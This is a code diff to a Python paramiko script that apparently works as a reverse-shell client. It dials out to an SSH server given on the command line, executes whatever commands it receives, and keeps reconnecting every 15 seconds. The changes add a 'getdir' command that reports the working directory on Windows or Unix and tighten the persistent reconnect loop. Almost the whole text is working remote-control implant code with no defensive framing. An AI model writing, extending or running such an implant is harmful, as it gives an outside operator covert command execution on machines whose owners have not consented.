@@ -2,6 +2,7 @@ import paramiko
 import subprocess
 import sys
 import time
+import platform
 
 #script args
 server_address = sys.argv[1]
@@ -31,6 +32,10 @@ def process_commands(client_session):
     command = client_session.recv(1024).decode('utf-8').split(" ")
     if command[0] == "exec":
         process_exec(client_session, " ".join(command[1:]))
+    elif command[0] == "getdir":
+        if platform.system() == "Windows":
+            process_exec(client_session, "cd")
+        else: process_exec(client_session, "pwd")
     elif command[0] == "quit":
         client_session.close()
         raise Exception
@@ -65,11 +70,11 @@ def ssh_command(server_address, server_port, username, password):
     client_session.close()
     return
 
-while True:
-    try:
-        ssh_command(server_address, server_port, username, password)
-    except KeyboardInterrupt:
-        sys.exit()
-    except Exception:
-        pass
-    time.sleep(15)
+try:
+    while True:
+        try:
+            ssh_command(server_address, server_port, username, password)
+        except Exception:
+            time.sleep(15)
+except KeyboardInterrupt:
+    sys.exit()
